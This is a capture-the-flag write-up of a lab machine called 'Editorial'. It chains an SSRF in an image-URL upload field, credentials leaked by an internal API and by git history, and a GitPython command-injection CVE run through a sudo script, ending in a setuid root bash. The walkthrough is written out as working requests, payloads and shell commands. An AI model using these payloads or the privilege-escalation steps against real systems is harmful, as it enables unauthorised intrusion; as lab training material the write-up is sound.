### Summary
We start the box with a web server that we discover is vulnerable to SSRF. We fuzz the internal services to find that port `5000` is open and provides documentation for an internal API. We can enumerate this API to find credentials for the `dev` user. With an `SSH` shell as `dev`, we find a git repo of the API app which we inspect to find credentials for the user `prod`. With `SSH` as `prod`, we see they're able to run a python script as `sudo` which utilizes a vulnerable version of `GitPython` allowing for `RCE`. We exploit this to create a `root` owned suid bash binary that's world executable

### Tools
- `feroxbuster`
- `burp`
- `ffuf`
- `git`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute-Force]]
- [[#HTTP - TCP 80]]
	- [[#Internal Service Scan]]
###### [[#User Shell - dev]]
- [[#Api Enumeration]]
- [[#Enumeration as dev]]
###### [[#User Shell - prod]]
- [[#Git Diff]]
- [[#Enumeration as prod]]
	- [[#clone_prod_changes.py]]
- [[#gitpython CVE-2022-24439]]
	- [[#POC]]
###### [[#Root Shell]]
- [[#Exploiting CVE-2022-24439]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.1.13 -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.1.13 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL lines up with a POSIX adherent system
- Given the OpenSSH and nginx versions, we're likely working with `Ubuntu 22.04`
- We're gonna need to do some subdomain brute-forcing given that the webserver tried to resolve `editorial.htb`

### Subdomain Brute-Force
```sh
❯ ffuf -u "http://10.129.1.13" -H "Host: FUZZ.editorial.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -ac 
```
- We don't get anything back, hopefully means there's nothing we're missing
- We'll add `editorial.htb` to our `/etc/hosts` file so we can properly resolve

- We can perform another `nmap` enumeration script on port `80` now that the domain is being resolved:
```sh
❯ sudo nmap -p 80 -sCV -vv 10.129.1.13
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Nothing interesting

## HTTP - TCP 80
---
- Navigating to the page shows us some book selling site. We see `Editorial Tiempo Arriba` in the bottom corner of the site
- We navigate to the `About` subdirectory to find an email: `submissions@tiempoarriba.htb`
- We can run `feroxbuster` but it doesn't show us anything interesting

- Theres a `Publish with us` hyperlink that redirects to an `uploads` subdirectory
![[Pasted image 20260211203820.png]]

- We can create a dummy book upload and capture the request in `Burp`
- Populating the fields isn't super interesting when clicking the `Send book info` button, but we can provide a URL and have the server fetch the image when clicking the `Preview` button, this smells like `SSRF`
- We can host our own image via a python webserver and see if we can force the server to grab it for us
```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 320
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryp1PBNmEUgmWPowNI
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryp1PBNmEUgmWPowNI
Content-Disposition: form-data; name="bookurl"

http://10.10.14.78:12345/image.png
------WebKitFormBoundaryp1PBNmEUgmWPowNI
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryp1PBNmEUgmWPowNI--


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 11 Feb 2026 18:53:11 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51

static/uploads/51c339f8-cf8e-4be4-9857-3c641cfd3c1c
```
- If we navigate to `static/uploads/51c339f8-cf8e-4be4-9857-3c641cfd3c1c` then we see it's the same picture that we were hosting!
- If we pass the root directory of our python webserver, it reads off the raw `HTML` of the page, meaning we can inspect the contents of any valid URL:
- If we feed it an invalid address, it responds with `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` meaning we can filter invalid requests with the regex `unsplash_photo`

### Internal Service Scan
```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 305
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryp1PBNmEUgmWPowNI
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryp1PBNmEUgmWPowNI
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundaryp1PBNmEUgmWPowNI
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryp1PBNmEUgmWPowNI--
```
- We copy the above request to a file that we can pass to `ffuf`

```sh
❯ ffuf -request request.req -w <(seq 1 65536) -request-proto http -ac
...
5000                [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 108ms]
...
```
- It took a bit of troubleshooting, but after passing it through burp (via `-x http://localhost:8080`) I figured out it was trying to force traffic through port `443` even though the server is only `HTTP`, so we can add `request-proto http` to disable this behavior

# User Shell - dev
## Api Enumeration
---
- Looks like port `5000` is active internally. We can perform a request via burp and follow the static image directory to grab whatever the contents of the root directory of this internal service is
```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
- This seems like documentation for an internal API, we can play around with these commands via burp
- Navigating to `/api/latest/metadata/messages/authors` gives the following:
```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```
- Looks like some potential credentials: `dev` / `dev080217_devAPI!@`
- We can test if these credentials work for `SSH`:
```sh
❯ nxc ssh 10.129.1.13 -u dev -p 'dev080217_devAPI!@'                          
SSH         10.129.1.13     22     10.129.1.13      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
SSH         10.129.1.13     22     10.129.1.13      [+] dev:dev080217_devAPI!@  Linux - Shell access!
```

## Enumeration as dev
---
- We can grab the `user.txt` file
```sh
dev@editorial:~$ cat user.txt 
09b5c7c75ea718f85c7c6740b985e116
```

- There are 2 users with home directories, `dev` and `prod`

- We notice in `dev`'s home directory theres an `app` directory but its empty. Listing all files shows a `.git` repository. We can perform `git status` to see what's going on:
```sh
dev@editorial:~/apps$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    app_api/app.py
        deleted:    app_editorial/app.py
        deleted:    app_editorial/static/css/bootstrap-grid.css
		...
```

# User Shell - prod
## Git Diff
---
- We can inspect the changes made to the repo with `git log --oneline`
```sh
dev@editorial:~/apps$ git log --oneline
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```
- Commit `b73481b` seems interesting, we might be able to find `prod` credentials
- We can find the differences between commits `1e84a03` and `b73481b` like so:
```sh
dev@editorial:~/apps$ git diff 1e84a03 b73481b
```
```diff
diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```
- Looks like the creds should be `prod` / `080217_Producti0n_2023!@`

```sh
❯ nxc ssh 10.129.1.13 -u prod -p '080217_Producti0n_2023!@'
SSH         10.129.1.13     22     10.129.1.13      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
SSH         10.129.1.13     22     10.129.1.13      [+] prod:080217_Producti0n_2023!@  Linux - Shell access!
```
- It works!

## Enumeration as prod
---
- There's nothing in `prod`'s home directory
- We can perform `sudo -l` to see that:
```sh
prod@editorial:/opt/internal_apps/clone_changes$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### clone_prod_changes.py
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
- The file doesn't allow us to write to it, it's owned by `root`

## gitpython CVE-2022-24439
---
- We can try to enumerate the version of the `git` python library:
```sh
prod@editorial:/opt/internal_apps/clone_changes$ python3
Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import git
>>> print(git.__version__)
3.1.29
```

```sh
prod@editorial:/opt/internal_apps/clone_changes$ pip freeze | grep -i git
gitdb==4.0.10
GitPython==3.1.29
```

- We can look up GitPython `3.1.29` cves and we're directed to [this link](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) which references a specific [commit](https://github.com/gitpython-developers/GitPython/commit/2625ed9fc074091c531c27ffcba7902771130261) in the repo
- The vulnerability is RCE, specifying that since a URL is passed directly to `git clone`, the `remote-ext` helper will happily execute shell commands

### POC
```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

- We can test the above POC and see what the results look like:
```sh
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'

prod@editorial:/opt/internal_apps/clone_changes$ ls -lah /tmp/pwned 
-rw-r--r-- 1 root root 0 Feb 11 20:07 /tmp/pwned
```
- It worked! The file `/tmp/pwned` is owned by root

# Root Shell
## Exploiting CVE-2022-24439
---
- To make this simple, we can create a bash script that'll perform all the actions we want (spawning a root owned suid bash)
```sh
prod@editorial:/opt/internal_apps/clone_changes$ vi /tmp/script.sh
prod@editorial:/opt/internal_apps/clone_changes$ cat $_
#!/bin/bash

cp /bin/bash /tmp/wallfly
chown root:root /tmp/wallfly
chmod 6777 /tmp/wallfly
```

- Now we can attempt to execute the exploit:
```sh
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/script.sh'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c /tmp/script.sh new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'

prod@editorial:/opt/internal_apps/clone_changes$ ls -lah /tmp/wallfly 
-rwsrwsrwx 1 root root 1.4M Feb 11 20:10 /tmp/wallfly

prod@editorial:/opt/internal_apps/clone_changes$ /tmp/wallfly -p
wallfly-5.1# whoami
root
wallfly-5.1# cat /root/root.txt
bfc8ed23310e168f9e7415dbef450413
```

